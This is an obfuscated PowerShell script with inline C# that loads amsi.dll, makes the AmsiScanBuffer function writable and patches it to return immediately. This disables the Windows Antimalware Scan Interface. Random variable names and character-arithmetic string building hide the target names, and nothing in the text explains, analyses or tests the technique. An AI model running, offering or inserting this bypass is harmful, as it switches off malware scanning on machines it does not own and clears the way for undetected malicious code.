$VLTEkh = @"
using System;
using System.Runtime.InteropServices;
public class VLTEkh {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr Qn4v0SqguL, string U3Dhp);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr fyL, UIntPtr IyYL, uint hJ9lvrRTTb37FHjt1, out uint nrZBpWGv);
}
"@

Add-Type $VLTEkh

$QcmPtBjzh = [VLTEkh]::LoadLibrary("$([CHAr]([bYTE]0x61)+[Char]([bYTE]0x6d)+[Char]([byte]0x73)+[cHaR]([bYtE]0x69)+[CHAr](46+38-38)+[cHAR](100*82/82)+[Char]([bYTe]0x6c)+[char](108))")
$v7_zaLRlc7zV = [VLTEkh]::GetProcAddress($QcmPtBjzh, "$(('ÃmsíSc'+'ànBùff'+'èr').noRMaLIzE([CHar]([byte]0x46)+[CHAr](111*88/88)+[CHaR](114+58-58)+[Char](96+13)+[CHaR]([BYTe]0x44)) -replace [cHAR](92*83/83)+[ChaR](112+60-60)+[cHar]([Byte]0x7b)+[ChAR]([bytE]0x4d)+[CHar]([BYtE]0x6e)+[char](125))")
$p = 0
[VLTEkh]::VirtualProtect($v7_zaLRlc7zV, [uint32]5, 0x40, [ref]$p)
$uT5_n7zojmFV6qnDgTC = "0xB8"
$iHqylZsYba3 = "0x57"
$dMuJOp_wXxBQZW3CDS2 = "0x00"
$H_YtnYzS = "0x07"
$P0tRQJy7zdoy2uu6ipJ = "0x80"
$HJNdoH0bxOzJlvx = "0xC3"
$cujTKF8Zgl = [Byte[]] ($uT5_n7zojmFV6qnDgTC,$iHqylZsYba3,$dMuJOp_wXxBQZW3CDS2,$H_YtnYzS,+$P0tRQJy7zdoy2uu6ipJ,+$HJNdoH0bxOzJlvx)
[System.Runtime.InteropServices.Marshal]::Copy($cujTKF8Zgl, 0, $v7_zaLRlc7zV, 6)